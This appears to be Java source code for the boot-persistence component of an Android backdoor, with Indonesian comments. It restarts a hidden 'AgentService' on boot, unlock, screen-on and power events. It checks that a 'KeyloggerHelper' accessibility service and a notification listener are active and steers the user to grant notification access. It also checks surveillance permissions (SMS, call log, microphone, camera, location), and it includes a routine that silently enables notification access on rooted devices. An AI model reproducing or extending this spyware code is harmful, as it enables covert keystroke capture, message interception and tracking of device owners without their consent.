package com.lazyframework.backdoor;

import static androidx.core.content.ContextCompat.registerReceiver;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

import androidx.core.content.ContextCompat;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "LazyFramework";
    private static final int DELAY_START_MS = 3000;
    private static final int MAX_RETRY = 5;
    private static int retryCount = 0;

    // ============ CUSTOM ACTIONS ============
    private static final String ACTION_QUICKBOOT_POWERON = "android.intent.action.QUICKBOOT_POWERON";
    private static final String ACTION_REBOOT = "android.intent.action.REBOOT";

    // ============ SETTINGS KEYS ============
    private static final String ENABLED_NOTIFICATION_LISTENERS = "enabled_notification_listeners";
    private static final String ENABLED_ACCESSIBILITY_SERVICES = "enabled_accessibility_services";

    private BroadcastReceiver mirrorReceiver;
    private boolean isReceiverRegistered = false;

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || intent.getAction() == null) {
            return;
        }

        Log.d(TAG, "📱 BootReceiver triggered");
        Log.d(TAG, "   Action: " + intent.getAction());
        Log.d(TAG, "   Package: " + context.getPackageName());

        String action = intent.getAction();

        // ============ HANDLE BOOT COMPLETED ============
        if (action.equals(Intent.ACTION_BOOT_COMPLETED) ||
                action.equals(ACTION_QUICKBOOT_POWERON) ||
                action.equals(ACTION_REBOOT) ||
                action.equals("android.intent.action.ACTION_BOOT_COMPLETED")) {

            Log.d(TAG, "📱 Device boot detected, starting service...");
            startAllServices(context);
            registerMirrorReceiver(context);
        }

        // ============ HANDLE USER PRESENT (Screen Unlock) ============
        else if (action.equals(Intent.ACTION_USER_PRESENT)) {
            Log.d(TAG, "👤 User present, checking services...");
            if (!isServiceRunning(context)) {
                Log.d(TAG, "🔄 Service not running, starting...");
                startAllServices(context);
            }
            checkNotificationListener(context);
        }

        // ============ HANDLE PACKAGE REPLACED (Update) ============
        else if (action.equals(Intent.ACTION_PACKAGE_REPLACED) ||
                action.equals(Intent.ACTION_MY_PACKAGE_REPLACED)) {
            String packageName = intent.getData() != null ?
                    intent.getData().getSchemeSpecificPart() : "";

            if (packageName.equals(context.getPackageName())) {
                Log.d(TAG, "📦 App updated, restarting services...");
                startAllServicesWithDelay(context, 1000);
            }
        }

        // ============ HANDLE SCREEN ON ============
        else if (action.equals(Intent.ACTION_SCREEN_ON)) {
            Log.d(TAG, "💡 Screen on, checking service status");
            if (!isServiceRunning(context)) {
                Log.d(TAG, "🔄 Service not running, starting...");
                startAllServices(context);
            }
        }
    }

    // ==================== REGISTER MIRROR RECEIVER ====================

    @SuppressLint("UnspecifiedRegisterReceiverFlag")
    private void registerMirrorReceiver(Context context) {
        try {
            unregisterMirrorReceiver(context);

            mirrorReceiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context ctx, Intent intent) {
                    String action = intent.getAction();
                    if ("com.lazyframework.MIRROR_STARTED".equals(action)) {
                        Log.d(TAG, "✅ Mirror started via broadcast");
                    } else if ("com.lazyframework.MIRROR_STOPPED".equals(action)) {
                        Log.d(TAG, "⏹️ Mirror stopped via broadcast");
                    } else if ("com.lazyframework.MIRROR_ERROR".equals(action)) {
                        String error = intent.getStringExtra("error");
                        Log.e(TAG, "❌ Mirror error: " + error);
                    } else if ("com.lazyframework.MIRROR_PERMISSION_RESULT".equals(action)) {
                        boolean success = intent.getBooleanExtra("success", false);
                        String message = intent.getStringExtra("message");
                        Log.d(TAG, "📊 Permission result: " + (success ? "GRANTED" : "DENIED") + " - " + message);
                    }
                }
            };

            IntentFilter filter = new IntentFilter();
            filter.addAction("com.lazyframework.MIRROR_STARTED");
            filter.addAction("com.lazyframework.MIRROR_STOPPED");
            filter.addAction("com.lazyframework.MIRROR_ERROR");
            filter.addAction("com.lazyframework.MIRROR_PERMISSION_RESULT");
            filter.addAction("com.lazyframework.MIRROR_STATUS");

            // ✅ FIX: Gunakan RECEIVER_EXPORTED untuk broadcast antar komponen
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                context.registerReceiver(mirrorReceiver, filter, Context.RECEIVER_EXPORTED);
            } else {
                context.registerReceiver(mirrorReceiver, filter);
            }
            isReceiverRegistered = true;
            Log.d(TAG, "✅ Mirror receiver registered");

        } catch (Exception e) {
            Log.e(TAG, "Register receiver error: " + e.getMessage());
        }
    }

    private void unregisterMirrorReceiver(Context context) {
        if (mirrorReceiver != null && isReceiverRegistered) {
            try {
                context.unregisterReceiver(mirrorReceiver);
                isReceiverRegistered = false;
                Log.d(TAG, "✅ Mirror receiver unregistered");
            } catch (Exception e) {
                Log.e(TAG, "Unregister receiver error: " + e.getMessage());
            }
        }
    }

    // ==================== START ALL SERVICES ====================

    private void startAllServices(Context context) {
        startAllServicesWithDelay(context, DELAY_START_MS);
    }

    private void startAllServicesWithDelay(Context context, long delayMs) {
        Handler handler = new Handler(Looper.getMainLooper());
        handler.postDelayed(() -> {
            try {
                Log.d(TAG, "🚀 Starting services after " + delayMs + "ms delay");

                // 1. Start AgentService
                startAgentService(context);

                // 2. Check Keylogger (Accessibility)
                checkAccessibilityService(context);

                // 3. Check Notification Listener
                checkNotificationListener(context);

                // 4. Check permissions
                checkPermissions(context);

                // Reset retry counter
                retryCount = 0;

                Log.d(TAG, "✅ All services started successfully");

            } catch (Exception e) {
                Log.e(TAG, "❌ Error starting services: " + e.getMessage());

                // Retry jika gagal
                retryCount++;
                if (retryCount < MAX_RETRY) {
                    Log.d(TAG, "🔄 Retry " + retryCount + "/" + MAX_RETRY);
                    startAllServicesWithDelay(context, 5000);
                } else {
                    Log.e(TAG, "❌ Max retry reached, giving up");
                }
            }
        }, delayMs);
    }

    // ==================== START AGENT SERVICE ====================

    private void startAgentService(Context context) {
        try {
            Intent serviceIntent = new Intent(context, AgentService.class);
            serviceIntent.putExtra("source", "BootReceiver");
            serviceIntent.putExtra("timestamp", System.currentTimeMillis());

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
                Log.d(TAG, "✅ Foreground service started (Android 8+)");
            } else {
                context.startService(serviceIntent);
                Log.d(TAG, "✅ Service started");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error starting AgentService: " + e.getMessage());
            throw e;
        }
    }

    // ==================== CHECK SERVICE RUNNING ====================

    private boolean isServiceRunning(Context context) {
        try {
            android.app.ActivityManager manager =
                    (android.app.ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);

            if (manager == null) return false;

            for (android.app.ActivityManager.RunningServiceInfo service :
                    manager.getRunningServices(Integer.MAX_VALUE)) {
                if (AgentService.class.getName().equals(service.service.getClassName())) {
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking service: " + e.getMessage());
        }
        return false;
    }

    // ==================== CHECK NOTIFICATION LISTENER ====================

    private void checkNotificationListener(Context context) {
        try {
            boolean isEnabled = isNotificationListenerEnabled(context);

            if (isEnabled) {
                Log.d(TAG, "✅ Notification listener is enabled");
            } else {
                Log.d(TAG, "⚠️ Notification listener is NOT enabled");
                Log.d(TAG, "   User needs to enable: Settings → Notification Access");

                // Try to open notification settings automatically
                openNotificationSettings(context);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking notification listener: " + e.getMessage());
        }
    }

    /**
     * Cek apakah Notification Listener sudah aktif
     */
    private boolean isNotificationListenerEnabled(Context context) {
        try {
            String enabledListeners = Settings.Secure.getString(
                    context.getContentResolver(),
                    "enabled_notification_listeners"
            );

            if (enabledListeners == null) {
                return false;
            }

            String packageName = context.getPackageName();
            String serviceName = packageName + "/" + NotificationListener.class.getName();

            return enabledListeners.contains(serviceName) ||
                    enabledListeners.contains(packageName);

        } catch (Exception e) {
            Log.e(TAG, "Error checking notification listener: " + e.getMessage());
            return false;
        }
    }

    /**
     * Buka halaman settings Notification Listener
     */
    private void openNotificationSettings(Context context) {
        try {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            Log.d(TAG, "🔔 Opened Notification Listener Settings");
        } catch (Exception e) {
            Log.d(TAG, "Cannot open notification listener settings directly: " + e.getMessage());

            try {
                Intent intent = new Intent(Settings.ACTION_SETTINGS);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                Log.d(TAG, "🔔 Opened General Settings");
            } catch (Exception e2) {
                Log.e(TAG, "Cannot open settings: " + e2.getMessage());
            }
        }
    }

    /**
     * Tampilkan notifikasi untuk mengaktifkan Notification Listener
     */
    private void notifyUserToEnableNotification(Context context) {
        try {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            Log.d(TAG, "🔔 Opened Notification Settings for user");
        } catch (Exception e) {
            Log.e(TAG, "Error opening notification settings: " + e.getMessage());
        }
    }

    // ==================== CHECK ACCESSIBILITY SERVICE ====================

    private void checkAccessibilityService(Context context) {
        try {
            String enabledServices = Settings.Secure.getString(
                    context.getContentResolver(),
                    "enabled_accessibility_services"
            );

            String packageName = context.getPackageName();
            String serviceName = packageName + "/" + KeyloggerHelper.class.getName();

            if (enabledServices != null && enabledServices.contains(serviceName)) {
                Log.d(TAG, "✅ Keylogger accessibility service is enabled");
            } else {
                Log.d(TAG, "⚠️ Keylogger accessibility service is NOT enabled");
                Log.d(TAG, "   User needs to enable: Settings → Accessibility → Keylogger Service");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking accessibility: " + e.getMessage());
        }
    }

    // ==================== CHECK PERMISSIONS ====================

    private void checkPermissions(Context context) {
        try {
            String[] permissions = {
                    android.Manifest.permission.INTERNET,
                    android.Manifest.permission.ACCESS_FINE_LOCATION,
                    android.Manifest.permission.ACCESS_COARSE_LOCATION,
                    android.Manifest.permission.READ_EXTERNAL_STORAGE,
                    android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    android.Manifest.permission.READ_CONTACTS,
                    android.Manifest.permission.READ_SMS,
                    android.Manifest.permission.READ_CALL_LOG,
                    android.Manifest.permission.RECORD_AUDIO,
                    android.Manifest.permission.CAMERA,
                    android.Manifest.permission.GET_ACCOUNTS
            };

            int granted = 0;
            int denied = 0;

            for (String permission : permissions) {
                if (context.checkCallingOrSelfPermission(permission) ==
                        PackageManager.PERMISSION_GRANTED) {
                    granted++;
                } else {
                    denied++;
                }
            }

            Log.d(TAG, "📊 Permission status: " + granted + " granted, " + denied + " denied");

            if (denied > 0) {
                Log.d(TAG, "⚠️ Some permissions are missing: " + denied + " permissions");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking permissions: " + e.getMessage());
        }
    }

    // ==================== TRY ENABLE NOTIFICATION LISTENER ====================

    /**
     * Mencoba mengaktifkan Notification Listener secara otomatis
     * (Metode alternatif untuk perangkat yang di-root)
     */
    private boolean tryAutoEnableNotificationListener(Context context) {
        try {
            String packageName = context.getPackageName();
            String serviceName = packageName + "/" + NotificationListener.class.getName();

            String currentListeners = Settings.Secure.getString(
                    context.getContentResolver(),
                    ENABLED_NOTIFICATION_LISTENERS
            );

            if (currentListeners == null) {
                currentListeners = "";
            }

            if (!currentListeners.contains(serviceName)) {
                String newListeners;
                if (currentListeners.isEmpty()) {
                    newListeners = serviceName;
                } else {
                    newListeners = currentListeners + ":" + serviceName;
                }

                Settings.Secure.putString(
                        context.getContentResolver(),
                        ENABLED_NOTIFICATION_LISTENERS,
                        newListeners
                );

                Log.d(TAG, "✅ Notification listener enabled automatically");
                return true;
            }

        } catch (Exception e) {
            Log.e(TAG, "Auto-enable error: " + e.getMessage());
        }
        return false;
    }

    // ==================== SETTINGS PAGE REDIRECT ====================

    private void openAppSettings(Context context) {
        try {
            Intent intent = new Intent(
                    Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    android.net.Uri.parse("package:" + context.getPackageName())
            );
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Error opening app settings: " + e.getMessage());
        }
    }

    // ==================== SCHEDULE SERVICE RESTART ====================

    public void scheduleServiceRestart(Context context) {
        try {
            Handler handler = new Handler(Looper.getMainLooper());
            handler.postDelayed(() -> {
                if (!isServiceRunning(context)) {
                    Log.d(TAG, "🔄 Scheduled restart: Service not running, starting...");
                    startAllServices(context);
                } else {
                    Log.d(TAG, "✅ Scheduled check: Service is running");
                }
                checkNotificationListener(context);
            }, 30000);
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling restart: " + e.getMessage());
        }
    }

    // ==================== HANDLE OTHER EVENTS ====================

    public void handleTimeTick(Context context) {
        if (!isServiceRunning(context)) {
            Log.d(TAG, "🔄 TimeTick: Service not running, starting...");
            startAllServices(context);
        }
        checkNotificationListener(context);
    }

    public void handlePowerConnected(Context context) {
        Log.d(TAG, "🔌 Power connected - checking services");
        if (!isServiceRunning(context)) {
            startAllServices(context);
        }
        checkNotificationListener(context);
    }

    public void handlePowerDisconnected(Context context) {
        Log.d(TAG, "🔋 Power disconnected - checking services");
        if (!isServiceRunning(context)) {
            startAllServices(context);
        }
    }
}